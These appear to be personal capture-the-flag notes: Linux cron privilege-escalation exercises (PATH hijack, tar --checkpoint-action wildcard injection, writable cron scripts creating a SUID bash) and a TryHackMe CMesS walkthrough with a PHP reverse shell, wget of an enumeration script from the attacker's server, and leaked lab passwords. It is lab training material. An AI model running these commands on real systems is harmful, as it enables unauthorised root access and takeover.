#corntab

### Crons Path
#createoverwrite
1. Find out if there are are scheduled corn jobs files. 
```
TCM@debian:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

2. 'overwrite.sh' cronjob file is running every minute, lets check where it is located. Unable to find in /home/user cronjob path. 
```
TCM@debian:~$ ls -la /home/user
total 56
drwxr-xr-x  6 TCM  user 4096 Aug 19 22:59 .
drwxr-xr-x  3 root root 4096 May 15  2017 ..
-rw-------  1 TCM  user 1056 Aug 20 00:10 .bash_history
-rw-r--r--  1 TCM  user  220 May 12  2017 .bash_logout
-rw-r--r--  1 TCM  user 3235 May 14  2017 .bashrc
drwxr-xr-x  2 TCM  user 4096 Aug 19 22:59 .config
drwx------  2 TCM  user 4096 Jun 18  2020 .gnupg
drwxr-xr-x  2 TCM  user 4096 May 13  2017 .irssi
-rw-------  1 TCM  user  137 May 15  2017 .lesshst
-rw-r--r--  1 TCM  user  186 Aug 19 22:58 libcalc.c
-rw-r--r--  1 TCM  user  212 May 15  2017 myvpn.ovpn
-rw-------  1 TCM  user   11 Aug 19 22:58 .nano_history
-rw-r--r--  1 TCM  user  725 May 13  2017 .profile
drwxr-xr-x 10 TCM  user 4096 Jun 18  2020 tools

```

3. Create one and give executable permissions. 
```
TCM@debian:~$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
TCM@debian:~$ chmod +x /home/user/overwrite.sh 
TCM@debian:~$ ls -la /home/user/
total 60
drwxr-xr-x  6 TCM  user 4096 Aug 20 00:22 .
drwxr-xr-x  3 root root 4096 May 15  2017 ..
-rw-------  1 TCM  user 1056 Aug 20 00:10 .bash_history
-rw-r--r--  1 TCM  user  220 May 12  2017 .bash_logout
-rw-r--r--  1 TCM  user 3235 May 14  2017 .bashrc
drwxr-xr-x  2 TCM  user 4096 Aug 19 22:59 .config
drwx------  2 TCM  user 4096 Jun 18  2020 .gnupg
drwxr-xr-x  2 TCM  user 4096 May 13  2017 .irssi
-rw-------  1 TCM  user  137 May 15  2017 .lesshst
-rw-r--r--  1 TCM  user  186 Aug 19 22:58 libcalc.c
-rw-r--r--  1 TCM  user  212 May 15  2017 myvpn.ovpn
-rw-------  1 TCM  user   11 Aug 19 22:58 .nano_history
-rwxr-xr-x  1 TCM  user   43 Aug 20 00:22 overwrite.sh
-rw-r--r--  1 TCM  user  725 May 13  2017 .profile
drwxr-xr-x 10 TCM  user 4096 Jun 18  2020 tools
```

4. Check out task corn job is doing. Rooted it. 
```
TCM@debian:~$ /tmp/bash -p
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# whoami
root
```

### Cron Wildcards
#runme

1. Check out the cronjob files. Found compress.sh is acceptign wildcards. 
```
TCM@debian:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh

```

2. Cat out the script on this file. 
```
TCM@debian:~$ cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *

```

3. Check permission and create wild card file named ' runme.sh' then give permission and create command files. 
```
TCM@debian:~$ pwd
/home/user
TCM@debian:~$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
TCM@debian:~$ ls
libcalc.c  myvpn.ovpn  overwrite.sh  runme.sh  tools
TCM@debian:~$ chmod 777 runme.sh 
TCM@debian:~$ touch /home/user/--checkpoint=1
TCM@debian:~$ touch /home/user/--checkpoint-action=exec=sh\runme.sh

```

4. Rooted. 
```
TCM@debian:~$ /tmp/bash -p
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# whoami
root

```

### Cron File Overwrites
#overwrite 
1. Add the new commands on overwrite.sh (can do netcat too.)
```
TCM@debian:~$ ls -la /usr/local/bin/overwrite.sh 
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
TCM@debian:~$ locate overwrite.sh
locate: warning: database `/var/cache/locate/locatedb' is more than 8 days old (actual age is 1157.8 days)
/usr/local/bin/overwrite.sh
TCM@debian:~$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh 
TCM@debian:~$ cat /usr/local/bin/overwrite.sh 
#!/bin/bash

echo `date` > /tmp/useless
cp /bin/bash /tmp/bash; chmod +s /tmp/bash

```

2. Check out after one minutes, the root it. 
```
TCM@debian:~$ ls -la /tmp
total 2032
drwxrwxrwt  2 root root    4096 Aug 20 00:43 .
drwxr-xr-x 22 root root    4096 Jun 17  2020 ..
-rw-r--r--  1 root root  181568 Aug 20 00:43 backup.tar.gz
-rwsr-sr-x  1 root staff 926536 Aug 20 00:43 bash
-rwsrwxrwx  1 root root  926536 Aug 19 23:17 nginxrootsh
-rwxr-xr-x  1 TCM  user    6845 Aug 19 23:45 service
-rw-r--r--  1 TCM  user      68 Aug 19 23:45 service.c
-rw-r--r--  1 root root      29 Aug 20 00:23 useless
TCM@debian:~$ /tmp/bash -p
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)

```

### CMesS - TryHackMe

1. Start Tryhackme machine and establish Vpn connection. 
2. Add the host name to /etc/hosts
```
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts      
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.121.47    cmess.thm

```

3. Start Nmap Scan and check out for each open port. 
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -A -T4 cmess.thm
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-09 22:16 EDT
Nmap scan report for cmess.thm (10.10.121.47)
Host is up (0.30s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9b652d3939a3850b4233bfd210c051f (RSA)
|   256 21c36e318b85228a6d72868fae64662b (ECDSA)
|_  256 5bb9757805d7ec43309617ffc6a86ced (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
|_http-generator: Gila CMS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=9/9%OT=22%CT=1%CU=34828%PV=Y%DS=2%DC=T%G=Y%TM=64FD2718
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)SEQ(
OS:SP=104%GCD=1%ISR=109%TI=Z%CI=I%TS=8)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3
OS:=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2=6
OS:8DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW
OS:6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   323.30 ms 10.8.0.1
2   323.50 ms cmess.thm (10.10.121.47)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.09 seconds

```

4. No pathway to enter from any open ports and subdirectories so, started looking for fuzzing subdomains. For that, download subdomain wordlists from GitHub.  https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt 

5. Use it to wfuzz subdomain. 
```
┌──(kali㉿kali)-[~]
└─$ wfuzz -c -f sub-fighter -w /home/kali/Downloads/subdomains-top1million-5000.txt -u 'http://cmess.thm/' -H "Host: FUZZ.cmess.thm" --hw 290
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://cmess.thm/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload    
=====================================================================

000000019:   200        30 L     104 W      934 Ch      "dev"      
^Z
zsh: suspended  wfuzz -c -f sub-fighter -w  -u 'http://cmess.thm/' -H "Host: FUZZ.cmess.thm" 

----hw 290 was used because 290 was for all subdomin which are error----
```

6. Add 'dev' on host name.
```
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.121.47    dev.cmess.thm
```

7. Check out 'dev.cmess.thm', login credentials found
```
Development Log
andre@cmess.thm

Have you guys fixed the bug that was found on live?
support@cmess.thm

Hey Andre, We have managed to fix the misconfigured .htaccess file, we're hoping to patch it in the upcoming patch!
support@cmess.thm

Update! We have had to delay the patch due to unforeseen circumstances
andre@cmess.thm

That's ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.
support@cmess.thm

Your password has been reset. Here: KPFTN_f2yxe%

```

8. Used obtained credentials and login on 'cmess.thm/admin' page. Get access to user 'andre' home page. 

9. Upload the Php reverse shell #monekypentest on Content > File manager page. then visit cmess.thm/assets/shell.phtml, do netcat listener, receive a shell. 
```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nvlp 1234             
listening on [any] 1234 ...
connect to [10.8.159.78] from (UNKNOWN) [10.10.121.47] 56022
Linux cmess 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 19:51:34 up 44 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

10. Upload linpeas.sh script to obtained shell, hosting http server #httpserver and then make it executable
```
┌──(kali㉿kali)-[~]
└─$ python -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...


$ wget http://10.8.159.78:8000/Downloads/LinEnum.sh
--2023-09-09 20:26:17--  http://10.8.159.78:8000/Downloads/LinEnum.sh
Connecting to 10.8.159.78:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: 'LinEnum.sh'

     0K .......... .......... .......... .......... .....     100% 59.7K=0.8s

2023-09-09 20:26:19 (59.7 KB/s) - 'LinEnum.sh' saved [46631/46631]

$ chmod +x LinEnum.sh
$ ./LinEnum.sh

```

10. Located andre back password. 
```
$ cat /opt/.password.bak
andres backup password
UQfsdCB7aAP6
$ 

```

11. SSH login on andres account. 
```
┌──(kali㉿kali)-[~]
└─$ ssh andre@10.10.121.47 
The authenticity of host '10.10.121.47 (10.10.121.47)' can't be established.
ED25519 key fingerprint is SHA256:hepiJY+DGs/ds1l4tweTdzOAbt+HxqpmNs3WyZFb4eQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:12: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.121.47' (ED25519) to the list of known hosts.
andre@10.10.121.47's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Thu Feb 13 15:02:43 2020 from 10.0.0.20
andre@cmess:~$ ls

```

12. Obtained user.txt, also check notes and found there is cron job backing up files. 
```
andre@cmess:~/backup$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *

```

13. Add vulnerabilities scripts
```
andre@cmess:~/backup$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/adre/backup/shell.sh
-bash: /home/adre/backup/shell.sh: No such file or directory
andre@cmess:~/backup$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/andre/backup/shell.sh
andre@cmess:~/backup$ ls
note  shell.sh
andre@cmess:~/backup$ chmod +x shell.sh 
andre@cmess:~/backup$ touch /home/andre/backup/--checkpoint=1
andre@cmess:~/backup$ touch /home/andre/backup/--checkpoint-action=exec=sh\ shell.sh
andre@cmess:~/backup$ ls
--checkpoint=1  --checkpoint-action=exec=sh shell.sh  note  shell.sh

```

14. Rooted and found root.txt
```
andre@cmess:~/backup$ ls -la /tmp
total 2744
drwxrwxrwt  9 root     root        4096 Sep  9 20:36 .
drwxr-xr-x 22 root     root        4096 Feb  6  2020 ..
-rw-r--r--  1 root     root         226 Sep  9 20:36 andre_backup.tar.gz
-rwsr-sr-x  1 root     root     1037528 Sep  9 20:36 bash


andre@cmess:~/backup$ /tmp/bash -p
bash-4.3# whoami
root

```